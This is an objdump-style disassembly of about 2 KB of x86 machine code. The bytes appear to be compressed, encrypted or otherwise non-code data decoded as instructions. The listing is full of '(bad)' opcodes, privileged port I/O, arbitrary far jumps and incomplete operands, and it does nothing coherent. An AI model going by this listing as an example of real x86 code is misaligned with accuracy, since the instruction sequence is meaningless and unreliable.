  422340:	fdivr  QWORD PTR [edi-0x2d]
  422343:	push   cs
  422344:	jb     0x422319
  422346:	retf   
  422347:	jmp    0xe82ee2bb
  42234c:	mov    ah,BYTE PTR [ebx-0x20c335e5]
  422352:	adc    eax,0x65
  422355:	(bad)  
  422356:	pushf  
  422357:	(bad)  
  422358:	lds    ebp,FWORD PTR [edi-0x48f52e6]
  42235e:	mov    bl,0x68
  422360:	xchg   BYTE PTR [ecx-0x1af01edb],dh
  422366:	pop    ebx
  422367:	cwde   
  422368:	out    0x49,eax
  42236a:	and    cl,BYTE PTR [ecx]
  42236c:	sub    BYTE PTR [edi-0xe3c3ac6],ch
  422372:	dec    esi
  422373:	out    dx,eax
  422374:	dec    eax
  422375:	(bad)  
  422376:	outs   dx,BYTE PTR ds:[esi]
  422377:	cmp    cl,BYTE PTR [ebx]
  422379:	mov    dh,0xfb
  42237b:	add    ebx,edi
  42237d:	dec    edx
  42237e:	mov    ah,0x18
  422380:	and    bl,BYTE PTR [esi+eiz*1-0x401d4dc0]
  422387:	sub    bh,BYTE PTR [edx+0x4c]
  42238a:	cmp    eax,0x4de4fe2d
  42238f:	aam    0x95
  422391:	push   sp
  422393:	mov    ch,0xee
  422395:	add    dh,dh
  422397:	and    bl,BYTE PTR ds:0x9f2cb0f6
  42239d:	jmp    0xb3ba:0xc0446a4d
  4223a4:	sahf   
  4223a5:	pop    esp
  4223a6:	out    dx,eax
  4223a7:	fisub  DWORD PTR [ebx-0x7b]
  4223aa:	and    cl,BYTE PTR ds:0xc19faa8d
  4223b0:	call   0xbf7054e4
  4223b5:	add    al,0xf4
  4223b7:	xor    bh,bh
  4223b9:	outs   dx,DWORD PTR ds:[esi]
  4223ba:	int3   
  4223bb:	mov    al,ds:0xb430d704
  4223c0:	xor    BYTE PTR [ecx],bl
  4223c2:	push   esp
  4223c3:	call   0x38a2:0x29b83d2
  4223ca:	sbb    al,ah
  4223cc:	mov    ah,0xf0
  4223ce:	es dec esi
  4223d0:	mov    eax,cs:0xaa8cf8a3
  4223d6:	pop    es
  4223d7:	leave  
  4223d8:	fcom   QWORD PTR [edx+0x1d]
  4223db:	cmp    eax,0x371a5831
  4223e0:	popa   
  4223e1:	sahf   
  4223e2:	jns    0x422420
  4223e4:	and    eax,0x43c85b43
  4223e9:	dec    ebp
  4223ea:	into   
  4223eb:	cmp    bl,BYTE PTR [ebp-0x70e69be3]
  4223f1:	ja     0x422430
  4223f3:	imul   esp,DWORD PTR [esp+ebp*1-0xdc8f861],0xc
  4223fb:	xor    BYTE PTR [esi+0x4],dh
  4223fe:	hlt    
  4223ff:	inc    eax
  422400:	jnp    0x422401
  422402:	mov    edx,0xea4de8ec
  422407:	cmc    
  422408:	retf   0x65c1
  42240b:	iret   
  42240c:	and    DWORD PTR [edi+eax*4-0x4da30030],ebp
  422413:	and    ch,BYTE PTR [ebx+0x3f]
  422416:	(bad)  
  422417:	in     al,dx
  422418:	mov    ebp,0xb3ee9edc
  42241d:	int    0x17
  42241f:	jg     0x4223b2
  422421:	mov    ah,0xf7
  422423:	pop    ds
  422424:	adc    DWORD PTR [edi-0x7f],0x9e6e2d14
  42242b:	inc    edi
  42242c:	icebp  
  42242d:	test   eax,0x9a7d2f2d
  422432:	ds push edx
  422434:	pop    ecx
  422435:	ins    DWORD PTR es:[edi],dx
  422436:	sbb    al,0x73
  422438:	repnz das 
  42243a:	cld    
  42243b:	cmp    al,0x27
  42243d:	and    BYTE PTR [edi],bh
  42243f:	jo     0x42240f
  422441:	push   es
  422442:	dec    esp
  422443:	mov    al,0x8
  422445:	or     dh,BYTE PTR [ebp*4+0x28004b4a]
  42244c:	icebp  
  42244d:	mov    cl,0xe9
  42244f:	inc    edi
  422450:	dec    ebx
  422451:	imul   ecx,DWORD PTR ds:0xfad03d69,0x3e
  422458:	lods   al,BYTE PTR ds:[esi]
  422459:	out    0x74,eax
  42245b:	(bad)  
  42245e:	test   al,0xb1
  422461:	xor    eax,0xbdd5ce2c
  422466:	mov    ecx,0x55f61109
  42246b:	stos   BYTE PTR es:[edi],al
  42246c:	clc    
  42246d:	fimul  WORD PTR [ecx]
  42246f:	loope  0x422407
  422471:	das    
  422472:	xchg   edx,eax
  422473:	call   0xc51a:0x19bdab06
  42247a:	bound  ebx,QWORD PTR [esi+0x77]
  42247d:	mov    ch,0x6a
  42247f:	js     0x42240d
  422481:	add    BYTE PTR [ebx+0x79172ea0],0xde
  422488:	out    0xff,eax
  42248a:	xchg   BYTE PTR [eax+eiz*4],dl
  42248d:	xchg   esi,eax
  42248e:	pop    ebp
  42248f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422490:	pop    edx
  422491:	sub    eax,0x6b1fd0ec
  422496:	nop
  422497:	rcl    BYTE PTR [ecx-0x6d8fb4f1],1
  42249d:	mov    bh,ah
  42249f:	push   es
  4224a0:	add    al,0x3
  4224a2:	xchg   esi,eax
  4224a3:	arpl   ax,ax
  4224a5:	pop    ecx
  4224a6:	push   ebx
  4224a7:	adc    ebp,DWORD PTR [ecx-0x1d5bb1c9]
  4224ad:	repz jp 0x42246c
  4224b0:	xchg   edx,eax
  4224b1:	xchg   edx,eax
  4224b2:	pop    edi
  4224b3:	dec    ebx
  4224b4:	dec    ebp
  4224b5:	mov    edx,0x1fa125bf
  4224ba:	mov    ah,0xb5
  4224bc:	pop    eax
  4224bd:	out    dx,eax
  4224be:	cli    
  4224bf:	jmp    0x1456754c
  4224c4:	adc    BYTE PTR [esi],bh
  4224c6:	mov    al,0x6a
  4224c8:	loopne 0x4224e1
  4224ca:	or     BYTE PTR [esi+0x6c1ebbc],ch
  4224d0:	std    
  4224d1:	ficom  WORD PTR [edx-0x65]
  4224d4:	std    
  4224d5:	inc    esi
  4224d6:	ret    0xec03
  4224d9:	in     eax,0x57
  4224db:	sbb    DWORD PTR [edi+0x4d],ebx
  4224de:	mov    ecx,0xac787789
  4224e3:	mov    DWORD PTR [eax],0xcf3a713
  4224e9:	bound  edx,QWORD PTR [edi-0x444e0782]
  4224ef:	loopne 0x4224af
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	pop    edi
  4224f3:	xlat   BYTE PTR ds:[ebx]
  4224f4:	xchg   ebp,eax
  4224f5:	bound  ebx,QWORD PTR [esi-0x1a9c38b0]
  4224fb:	out    dx,al
  4224fc:	shl    BYTE PTR [esi+0xabdcd96],cl
  422502:	xchg   BYTE PTR [esi*2+0x14952aa5],cl
  422509:	xchg   esp,eax
  42250a:	int3   
  42250b:	xchg   ecx,eax
  42250c:	add    DWORD PTR [edx+ecx*2],eax
  42250f:	sbb    DWORD PTR [edx+0x73baf011],0xc
  422516:	retf   0xdaf1
  422519:	jnp    0x422574
  42251b:	shl    DWORD PTR [esp+ebx*1-0x1],1
  42251f:	(bad)  
  422520:	es inc esi
  422522:	loopne 0x422548
  422524:	lock fimul WORD PTR [eax]
  422527:	(bad)  
  422528:	push   0x2c4c13fb
  42252d:	xchg   esi,eax
  42252e:	loopne 0x42257e
  422530:	test   al,0xa7
  422532:	or     BYTE PTR [eax+ecx*2-0x68f3e43],al
  422539:	movsx  edx,WORD PTR [edi]
  42253c:	dec    ebp
  42253d:	stc    
  42253e:	xchg   ebp,eax
  42253f:	outs   dx,BYTE PTR ds:[esi]
  422540:	jb     0x4225bd
  422542:	ins    DWORD PTR es:[edi],dx
  422543:	inc    esp
  422544:	ror    BYTE PTR [esi],0x8b
  422547:	pop    ecx
  422548:	stos   BYTE PTR es:[edi],al
  422549:	pop    ebx
  42254a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42254c:	add    al,bh
  42254e:	es ins BYTE PTR es:[edi],dx
  422550:	(bad)  
  422551:	adc    al,0x21
  422553:	jb     0x4224d9
  422555:	or     DWORD PTR [esp+ebx*4+0x6e],esi
  422559:	scas   al,BYTE PTR es:[edi]
  42255a:	aas    
  42255b:	cmp    ecx,DWORD PTR [esi]
  42255d:	dec    ebx
  42255e:	and    BYTE PTR ds:0xff90e092,dl
  422564:	sbb    BYTE PTR [edi],al
  422566:	lds    edi,FWORD PTR [edi+0x31]
  422569:	gs or  eax,0xac0d57ae
  42256f:	mov    ds:0xb32427f7,al
  422574:	push   0x7e
  422576:	test   DWORD PTR [ebp-0x37],esi
  422579:	sub    DWORD PTR [eax],esi
  42257b:	ffreep st(7)
  42257d:	js     0x4225dc
  42257f:	sub    eax,0x527cb866
  422584:	mov    DWORD PTR [ebp+0x59],eax
  422587:	adc    DWORD PTR [esp+eiz*2+0x5b],edi
  42258b:	xchg   esi,eax
  42258c:	add    BYTE PTR [ebx],cl
  42258e:	dec    esi
  42258f:	xchg   edx,eax
  422590:	jle    0x422610
  422592:	push   ds
  422593:	mov    ds:0xdb88472a,al
  422598:	add    eax,0xd3a06a2c
  42259d:	adc    eax,0x2c72efe3
  4225a2:	ins    DWORD PTR es:[edi],dx
  4225a3:	mov    esi,cs
  4225a5:	int    0xf1
  4225a7:	leave  
  4225a8:	mov    cl,0xb2
  4225aa:	scas   al,BYTE PTR es:[edi]
  4225ab:	(bad)  
  4225ac:	std    
  4225ad:	cmc    
  4225ae:	enter  0xbd63,0xfe
  4225b2:	shl    BYTE PTR [edi+0x3a],0x2c
  4225b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225b7:	sbb    DWORD PTR [edx+0x27],ebp
  4225ba:	ins    BYTE PTR es:[edi],dx
  4225bb:	lods   al,BYTE PTR ds:[esi]
  4225bc:	lock xor cl,bl
  4225bf:	and    BYTE PTR [edi-0x6b],ah
  4225c2:	shr    esp,cl
  4225c4:	das    
  4225c5:	lds    ebx,FWORD PTR [edi]
  4225c7:	push   fs
  4225c9:	mov    edx,0x85cf59c
  4225ce:	mov    dl,0xdf
  4225d0:	or     al,0x29
  4225d2:	add    ebp,ebp
  4225d4:	adc    ch,BYTE PTR [edi+ebx*8+0x50]
  4225d8:	jo     0x42260a
  4225da:	mov    esp,0xc03c595
  4225df:	xchg   ecx,ebx
  4225e1:	add    dh,ah
  4225e3:	out    dx,eax
  4225e4:	pop    eax
  4225e5:	push   ebx
  4225e6:	fcomip st,st(1)
  4225e8:	adc    eax,0xb6b5e959
  4225ed:	xchg   ch,cl
  4225ef:	mov    ds:0xc3e64562,eax
  4225f4:	ficomp DWORD PTR [ecx-0x2c2df36d]
  4225fa:	cmp    al,0x98
  4225fc:	aad    0xcf
  4225fe:	adc    eax,0xbc927cde
  422603:	jnp    0x4225ea
  422605:	fisub  WORD PTR [bp+si]
  422608:	fcom   DWORD PTR [ebp+eax*1-0x6c]
  42260c:	and    al,0xf3
  42260e:	jge    0x422636
  422610:	shr    DWORD PTR [esi],1
  422612:	or     al,0x1b
  422614:	or     BYTE PTR [esi-0x1e],bh
  422617:	or     esp,edi
  422619:	dec    esp
  42261a:	mov    ds:0xec45769e,al
  42261f:	xchg   ebx,eax
  422620:	adc    ecx,DWORD PTR [ecx-0xa8b19ca]
  422626:	xchg   ecx,eax
  422627:	xchg   ecx,eax
  422628:	pop    ecx
  422629:	add    bh,dh
  42262b:	xchg   BYTE PTR [esi],dl
  42262d:	popa   
  42262e:	inc    esi
  42262f:	dec    edi
  422630:	jp     0x4225f1
  422632:	push   ss
  422633:	ins    DWORD PTR es:[edi],dx
  422634:	scas   eax,DWORD PTR es:[di]
  422636:	xor    ah,BYTE PTR [ebp+0x24]
  422639:	mov    edi,0x9b2c617e
  42263e:	push   edx
  42263f:	scas   al,BYTE PTR es:[edi]
  422640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422641:	and    bh,BYTE PTR [edi-0x72]
  422644:	in     al,dx
  422645:	push   ebp
  422646:	mov    ah,dl
  422648:	ret    0xe926
  42264b:	int3   
  42264c:	jl     0x42269d
  42264e:	mov    al,0x24
  422650:	jge    0x4225e0
  422652:	imul   ebp
  422654:	pop    ebp
  422655:	ret    0x64ff
  422658:	mov    edx,0x47172a9f
  42265d:	xchg   esi,eax
  42265e:	mov    WORD PTR [edi+ecx*2-0x9583d84],es
  422665:	xor    eax,0x31401812
  42266a:	sub    DWORD PTR [ebx+esi*1+0x4b],0x40ffa4f2
  422672:	adc    eax,0x8cd847a4
  422677:	les    edi,FWORD PTR [eax]
  422679:	imul   ebp,DWORD PTR [esi+ebp*2-0x3222ba1a],0x20
  422681:	das    
  422682:	adc    ebx,DWORD PTR [esp]
  422685:	xor    eax,0x8c2269d9
  42268a:	icebp  
  42268b:	adc    al,0xc1
  42268d:	pop    ds
  42268e:	add    BYTE PTR [edx+ebp*1],bh
  422691:	je     0x4226db
  422693:	(bad)  
  422694:	imul   edx,edi,0xfffffff5
  422697:	out    0x8a,al
  422699:	dec    eax
  42269a:	(bad)  
  42269b:	push   ds
  42269c:	int3   
  42269d:	pop    ecx
  42269e:	in     eax,dx
  42269f:	jo     0x42271c
  4226a1:	dec    edx
  4226a2:	sbb    ecx,DWORD PTR ds:0x3aef132e
  4226a8:	aaa    
  4226a9:	rcr    DWORD PTR [ecx+0xf5c8c7d],1
  4226af:	push   edx
  4226b0:	not    eax
  4226b2:	push   ebp
  4226b3:	sbb    BYTE PTR [ebp+0x6a],0x47
  4226b7:	dec    eax
  4226b8:	jmp    FWORD PTR [edx-0x6539fe8c]
  4226be:	mov    eax,0x37c980a0
  4226c3:	xchg   esp,eax
  4226c4:	sbb    al,0x5b
  4226c6:	mov    edx,esp
  4226c8:	push   edx
  4226c9:	push   edx
  4226ca:	nop
  4226cb:	mov    WORD PTR [edi+0x9],ss
  4226ce:	xchg   edi,eax
  4226cf:	push   es
  4226d0:	fidiv  WORD PTR gs:[esi]
  4226d3:	push   es
  4226d4:	call   0x89d28ba0
  4226d9:	data16 repz cmp al,0x5b
  4226dd:	add    dh,ch
  4226df:	sbb    BYTE PTR [esi],cl
  4226e1:	mov    ds:0x672df1b5,al
  4226e6:	xchg   ebx,esi
  4226e8:	or     DWORD PTR [edi+0x46ea865e],ebx
  4226ee:	stos   BYTE PTR es:[edi],al
  4226ef:	push   edi
  4226f0:	lock jnp 0x4226ee
  4226f3:	mov    edx,0xdd471875
  4226f8:	iret   
  4226f9:	in     eax,0x93
  4226fb:	mov    ecx,0xbc86670b
  422700:	xchg   edi,eax
  422701:	jae    0x42270c
  422703:	fsubr  DWORD PTR [edx-0x64]
  422706:	adc    BYTE PTR ds:0xd877cbb8,bl
  42270c:	mov    ah,cl
  42270e:	data16 mov ?,WORD PTR [eax]
  422711:	mov    dl,0x93
  422713:	scas   al,BYTE PTR es:[edi]
  422714:	mov    ?,esi
  422716:	push   cs
  422717:	je     0x42274c
  422719:	fst    QWORD PTR ds:0xeb1ee6dc
  42271f:	les    eax,FWORD PTR [edx+0x5f3ad400]
  422725:	daa    
  422726:	pop    ds
  422727:	xchg   edi,eax
  422728:	scas   al,BYTE PTR es:[edi]
  422729:	push   ds
  42272a:	mov    al,0x14
  42272c:	call   0x8963:0x5384c99f
  422733:	out    0x3b,eax
  422735:	lods   eax,DWORD PTR ds:[esi]
  422736:	jno    0x4227a9
  422738:	sbb    esi,ebp
  42273a:	pushf  
  42273b:	jp     0x422794
  42273d:	jb     0x422758
  42273f:	lods   eax,DWORD PTR ds:[esi]
  422740:	lods   eax,DWORD PTR ds:[esi]
  422741:	sub    ebp,DWORD PTR [edi+0x2ce8fbf5]
  422747:	mov    ebx,0x9e2c57f9
  42274c:	ds popa 
  42274e:	and    esp,DWORD PTR [ecx]
  422750:	xchg   edx,eax
  422751:	vcvtsi2sd xmm7,xmm6,DWORD PTR [edi-0x7507415a]
  422759:	cmp    ah,dl
  42275b:	retf   0x4e10
  42275e:	inc    esi
  42275f:	push   esi
  422760:	cmc    
  422761:	sub    al,BYTE PTR [edx-0x4de137d1]
  422767:	fs leave 
  422769:	sub    BYTE PTR [ebx+0x2eb684df],dl
  42276f:	jb     0x422732
  422771:	push   ebp
  422772:	out    0xea,al
  422774:	mov    ebp,0x1b4666ed
  422779:	xor    eax,0xc5ad56e1
  42277e:	loopne 0x422762
  422780:	xchg   esi,eax
  422781:	add    BYTE PTR [esi-0x56],0xae
  422785:	hlt    
  422786:	cld    
  422787:	or     eax,0xc70d3f36
  42278c:	mov    cl,ah
  42278e:	pop    eax
  42278f:	aas    
  422790:	inc    edx
  422791:	mov    edi,0xf5ce2ff8
  422796:	je     0x42277c
  422798:	adc    eax,0x5b02c06b
  42279d:	lahf   
  42279e:	mov    edi,0xbd6c17aa
  4227a3:	mov    DWORD PTR [ebx-0x73122af6],ecx
  4227a9:	adc    eax,DWORD PTR [ebp-0xccbec96]
  4227af:	push   ss
  4227b0:	cmp    bl,BYTE PTR [ecx]
  4227b2:	mov    ds:0xf75baef2,al
  4227b7:	and    BYTE PTR [ecx+0x2b8d4e1c],0x97
  4227be:	inc    ebx
  4227bf:	sbb    BYTE PTR [eax+0x488cb3ec],0xcf
  4227c6:	sahf   
  4227c7:	fwait
  4227c8:	sub    al,0xa3
  4227ca:	add    cl,dh
  4227cc:	sti    
  4227cd:	dec    BYTE PTR [ecx+ebp*2+0x78]
  4227d1:	shl    BYTE PTR [ecx],cl
  4227d3:	mov    esp,0xe99e1fa8
  4227d8:	ret    
  4227d9:	mul    DWORD PTR [ecx+0x5a]
  4227dc:	adc    DWORD PTR [ebx+0x4d],esi
  4227df:	aam    0xc7
  4227e1:	inc    esi
  4227e2:	hlt    
  4227e3:	sub    bh,BYTE PTR [esi-0x11]
  4227e6:	and    al,0xbb
  4227e8:	cmp    eax,DWORD PTR [ebp+0x1a05b60d]
  4227ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ef:	or     ebx,0x9cb6ec3c
  4227f5:	xchg   esi,eax
  4227f6:	cli    
  4227f7:	push   0x1bfe4546
  4227fc:	push   edx
  4227fd:	add    al,dl
  4227ff:	(bad)  
  422800:	sub    BYTE PTR [ebp-0x40],al
  422803:	cmp    BYTE PTR [esi],ch
  422805:	jne    0x4227ff
  422807:	push   ebx
  422808:	mov    ecx,0xe07ab04
  42280d:	test   al,0xd7
  42280f:	cli    
  422810:	jl     0x42279b
  422812:	into   
  422813:	push   esp
  422814:	add    eax,0x9f188c3
  422819:	pop    es
  42281a:	outs   dx,DWORD PTR es:[esi]
  42281c:	arpl   WORD PTR [ebx+0x13],bx
  42281f:	sbb    al,0x48
  422821:	mov    ah,ah
  422823:	push   ds
  422824:	call   0x9f79:0x3f101597
  42282b:	xchg   esi,eax
  42282c:	xchg   ebx,eax
  42282d:	dec    esi
  42282e:	loop   0x422821
  422830:	and    DWORD PTR [esi-0x65],edx
  422833:	retf   
  422834:	test   cl,cl
  422836:	cmp    ebx,ebp
  422838:	cli    
  422839:	jns    0x4227da
  42283b:	xor    DWORD PTR [eax],esp
  42283d:	call   FWORD PTR [ecx]
  42283f:	fisttp WORD PTR [ebx]
  422841:	fild   DWORD PTR [ebx+0x34]
  422844:	push   ds
  422845:	adc    eax,0xa0eade03
  42284a:	nop
  42284b:	stos   DWORD PTR es:[edi],eax
  42284c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42284d:	paddw  mm6,QWORD PTR [edi+0x5ad3d503]
  422854:	cmp    ch,al
  422856:	mov    WORD PTR [eax+0x2b],ss
  422859:	adc    al,0x61
  42285b:	sub    ebp,DWORD PTR [esi+0x3c]
  42285e:	add    DWORD PTR [edx+0x35],edi
  422861:	jb     0x4228c9
  422863:	and    al,BYTE PTR [edi-0x274fc28d]
  422869:	dec    esi
  42286a:	mov    ebx,0x8ada7f76
  42286f:	cwde   
  422870:	jp     0x4228b4
  422872:	ins    BYTE PTR es:[edi],dx
  422873:	or     edi,DWORD PTR [ebx]
  422875:	adc    BYTE PTR gs:[edi-0x28b6d2ae],dh
  42287c:	(bad)  
  42287d:	js     0x422883
  42287f:	jmp    0xd4ef1d6f
  422884:	outs   dx,DWORD PTR ds:[esi]
  422885:	pop    edx
  422886:	pop    esi
  422887:	leave  
  422888:	push   esi
  422889:	xchg   DWORD PTR [ebx+0x6f3839ae],ebp
  42288f:	jle    0x422884
  422891:	sbb    DWORD PTR [ecx-0x5a],ecx
  422894:	retf   
  422895:	mov    ecx,0x2dae4013
  42289a:	repnz dec ecx
  42289c:	pop    edi
  42289d:	and    bh,BYTE PTR [ebx-0x113332b9]
  4228a3:	add    DWORD PTR [edx],esp
  4228a5:	or     eax,0xc5d75a3c
  4228aa:	push   ebx
  4228ab:	pop    ds
  4228ac:	cs ins DWORD PTR es:[edi],dx
  4228ae:	cmp    esi,DWORD PTR ds:0xe9ff5683
  4228b4:	inc    DWORD PTR [eax+eiz*8]
  4228b7:	mov    ch,0x64
  4228b9:	test   BYTE PTR [ecx-0x7135673c],al
  4228bf:	and    al,0x93
  4228c1:	add    eax,0x6425eff9
  4228c6:	out    0x6,al
  4228c8:	xchg   ecx,eax
  4228c9:	xchg   edi,eax
  4228ca:	neg    DWORD PTR [eax+eiz*4]
  4228cd:	dec    ebp
  4228ce:	add    esi,0xffffff91
  4228d1:	xor    eax,0x8ec08e68
  4228d6:	or     DWORD PTR [edx-0x2bec3251],esp
  4228dc:	inc    edi
  4228dd:	push   esi
  4228de:	fstp   DWORD PTR [esi+eax*4+0x66]
  4228e2:	mov    al,0xaa
  4228e4:	popa   
  4228e5:	fisub  DWORD PTR [edi+0x48775464]
  4228eb:	dec    ecx
  4228ec:	hlt    
  4228ed:	cmp    al,0x39
  4228ef:	sbb    dh,cl
  4228f1:	jl     0x4228c4
  4228f3:	(bad)  
  4228f5:	(bad)  
  4228f6:	sti    
  4228f7:	push   ecx
  4228f8:	daa    
  4228f9:	sti    
  4228fa:	cmp    DWORD PTR [eax-0x2d],0x4ad25e6c
  422901:	fmul   DWORD PTR [edi+0x22]
  422904:	mov    eax,ds:0xbb3fef8e
  422909:	stos   BYTE PTR es:[edi],al
  42290a:	inc    edi
  42290b:	xor    DWORD PTR ss:[edx],eax
  42290e:	xor    al,0xd9
  422910:	rcl    DWORD PTR [esi+eax*4-0x32],cl
  422914:	sub    cl,BYTE PTR [ecx+ecx*2+0x2f]
  422918:	push   ds
  422919:	adc    BYTE PTR [eax+edi*4+0x5449c0dd],bl
  422920:	and    eax,0x6620da3e
  422925:	in     eax,dx
  422926:	idiv   DWORD PTR [ecx-0x40f1e0df]
  42292c:	fnsave [edi+ebx*4]
  42292f:	sahf   
  422930:	dec    edi
  422931:	mov    edx,0x5bd8dc80
  422936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422937:	push   0x1fe8ccab
  42293c:	mov    ebp,0x9dca5baf
  422941:	push   0xfd26f93a
  422946:	out    0x2d,al
  422948:	and    bh,BYTE PTR ds:[eax-0x64]
  42294c:	jns    0x422902
  42294e:	adc    eax,0xe4aea011
  422953:	sbb    bh,BYTE PTR [edx]
  422955:	xchg   esp,eax
  422956:	adc    edi,DWORD PTR [ecx]
  422958:	pop    ecx
  422959:	aaa    
  42295a:	xor    DWORD PTR [edx-0x5d],0xceff3e4e
  422961:	(bad)  
  422962:	cmc    
  422963:	shl    BYTE PTR [ebx+ecx*4],0x4c
  422967:	mov    ss,WORD PTR [ebx-0x2ca09232]
  42296d:	into   
  42296e:	pop    ss
  42296f:	push   es
  422970:	jmp    0x140dcaae
  422975:	add    al,0x1
  422977:	jge    0x422959
  422979:	(bad)  
  42297a:	popa   
  42297b:	add    dh,BYTE PTR [edi-0x31]
  42297e:	and    al,0x36
  422980:	push   0x1d240d5d
  422985:	aam    0x30
  422987:	bound  ebx,QWORD PTR [ebx+0x14]
  42298a:	xchg   edx,eax
  42298b:	stos   DWORD PTR es:[edi],eax
  42298c:	or     eax,0xe84f1b18
  422991:	lock and edx,DWORD PTR [ecx+0x34]
  422995:	inc    ebp
  422996:	(bad)  
  422997:	mov    DWORD PTR [eax*2+0x77732847],ebx
  42299e:	(bad)  
  4229a0:	or     BYTE PTR [ecx],bl
  4229a2:	xor    eax,0x9197a802
  4229a7:	mov    esp,0xdd0dce57
  4229ac:	dec    edi
  4229ad:	leave  
  4229ae:	ja     0x422997
  4229b0:	mov    esi,0x7e4b658f
  4229b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229b6:	test   DWORD PTR [ecx+0x360f623d],0x5da877af
  4229c0:	mov    dh,0x9b
  4229c2:	imul   ebp,DWORD PTR [ecx+0xed29036],0xa8d08098
  4229cc:	mov    ds:0x4781990c,eax
  4229d1:	mov    esp,0x24986cf5
  4229d6:	fsubr  DWORD PTR [ecx+0x28cf54f2]
  4229dc:	sbb    eax,DWORD PTR [ecx+0x22]
  4229df:	leave  
  4229e0:	nop
  4229e1:	or     ebx,DWORD PTR [ecx-0x4a9131ea]
  4229e7:	jo     0x422982
  4229e9:	cmp    DWORD PTR [esi],ebx
  4229eb:	jne    0x422a52
  4229ed:	les    ecx,FWORD PTR [ecx-0x2]
  4229f0:	cmp    BYTE PTR [edx+esi*8-0x42],al
  4229f4:	fadd   QWORD PTR [edi+0x25]
  4229f7:	push   esi
  4229f8:	retf   0x1067
  4229fb:	xor    eax,0xf1c128f
  422a00:	xor    DWORD PTR [ecx],esi
  422a02:	sub    eax,ecx
  422a04:	mov    edx,0x1e136afc
  422a09:	hlt    
  422a0a:	and    eax,esp
  422a0c:	xchg   ebx,eax
  422a0d:	aaa    
  422a0e:	inc    edi
  422a0f:	jmp    0x294f:0x50cfec2e
  422a16:	mov    edi,0xbeada505
  422a1b:	mov    eax,ds:0x1bdf480d
  422a20:	mov    ch,0xbb
  422a22:	push   0x7a987de
  422a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a28:	int    0x58
  422a2a:	mov    WORD PTR [edi+0xa9f62f9],?
  422a30:	es aaa 
  422a32:	xor    BYTE PTR [ebp-0x5f],bl
  422a35:	shr    BYTE PTR [eax],0x87
  422a38:	fmul   st,st(7)
  422a3a:	mov    edi,0xb95d046e
  422a3f:	pop    eax
  422a40:	ror    DWORD PTR [edi],cl
  422a42:	ret    0xfe41
  422a45:	or     BYTE PTR [esi-0x4d],ch
  422a48:	retf   0xcb3b
  422a4b:	sti    
  422a4c:	cmp    DWORD PTR [ecx-0x35],ebx
  422a4f:	ret    
  422a50:	nop
  422a51:	jns    0x422a1e
  422a53:	arpl   WORD PTR [ecx-0x76497492],ax
  422a59:	clc    
  422a5a:	sub    eax,0xedeb782b
  422a5f:	xchg   esp,eax
  422a60:	xchg   DWORD PTR ds:0x31bcae3d,esp
  422a66:	sbb    dh,0x9
  422a69:	pop    edi
  422a6a:	ins    BYTE PTR es:[edi],dx
  422a6b:	push   eax
  422a6c:	pop    ebp
  422a6d:	lods   eax,DWORD PTR ds:[esi]
  422a6e:	es pusha 
  422a70:	jp     0x422a95
  422a72:	dec    ecx
  422a73:	idiv   eax
  422a75:	push   edi
  422a76:	add    DWORD PTR [ecx+0x1b2c1d33],esp
  422a7c:	and    al,0x3f
  422a7e:	call   0x6d2f4a67
  422a83:	call   0xf4303554
  422a88:	cmp    al,0x9a
  422a8a:	pushf  
  422a8b:	jecxz  0x422a76
  422a8d:	std    
  422a8e:	adc    DWORD PTR [ecx+ebx*8],ebx
  422a91:	fiadd  WORD PTR [edi+0x43]
  422a94:	inc    edx
  422a95:	ins    DWORD PTR es:[edi],dx
  422a96:	xor    al,0x8a
  422a98:	(bad)  [edi]
  422a9a:	nop
  422a9b:	sti    
  422a9c:	fsubr  QWORD PTR [esi-0x963819d]
  422aa2:	ins    DWORD PTR es:[edi],dx
  422aa3:	cli    
  422aa4:	and    BYTE PTR [ebx-0x739e4707],dh
  422aaa:	mov    ds:0x62564ec0,eax
  422aaf:	jle    0x422b2c
  422ab1:	ss jno 0x422ac8
  422ab4:	fimul  WORD PTR [edi+0x18860b6d]
  422aba:	and    eax,0xdc940f08
  422abf:	or     dh,ch
  422ac1:	clc    
  422ac2:	outs   dx,BYTE PTR ds:[esi]
  422ac3:	out    0x98,eax
  422ac5:	iret   
  422ac6:	jmp    0x422b40
  422ac8:	mov    BYTE PTR [ebx],0x28
  422acb:	pop    esi
  422acc:	mov    al,ds:0xc06084d7
  422ad1:	pop    ss
  422ad2:	pop    ds
  422ad3:	lods   al,BYTE PTR ds:[esi]
  422ad4:	and    eax,0xa5630789
  422ad9:	outs   dx,BYTE PTR ds:[esi]
  422ada:	sbb    DWORD PTR [edx-0x29],ebx
  422add:	push   ebx
  422ade:	adc    al,BYTE PTR [ebp+0x654b83cb]
  422ae4:	mov    esi,0xb6d0e97c
  422ae9:	jle    0x422ae6
  422aeb:	mov    eax,0xde392297
  422af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422af1:	into   
  422af2:	pop    ebp
  422af3:	cmp    BYTE PTR [edi],cl
  422af5:	ins    DWORD PTR es:[edi],dx
  422af6:	jmp    0x16a9:0x9249b787
  422afd:	test   al,0xaa
  422aff:	sbb    esi,DWORD PTR [edi-0x7a6a4b7f]
  422b05:	pop    ds
  422b06:	add    edx,edx
  422b08:	xchg   esp,eax
  422b09:	add    eax,0x4d53c9c8
  422b0e:	test   DWORD PTR ds:0x367406c8,edx
  422b14:	in     eax,0x61
  422b16:	pop    esi
  422b17:	stos   DWORD PTR es:[edi],eax
  422b18:	dec    ebx
  422b19:	sub    ch,BYTE PTR [eax]
  422b1b:	enter  0x709d,0x39
  422b1f:	sbb    bh,BYTE PTR [edi+0x2d2985c2]
  422b25:	cmp    dl,BYTE PTR [eax-0x27]
  422b28:	cli    
  422b29:	data16 mov dl,0x68
  422b2c:	dec    esp
  422b2d:	sbb    al,0x40
  422b2f:	xor    eax,0x3e946f93
  422b34:	jmp    0x5d2e:0x4a2d415f
  422b3b:	(bad)  
  422b3c:	popf   
  422b3d:	mov    ebx,gs
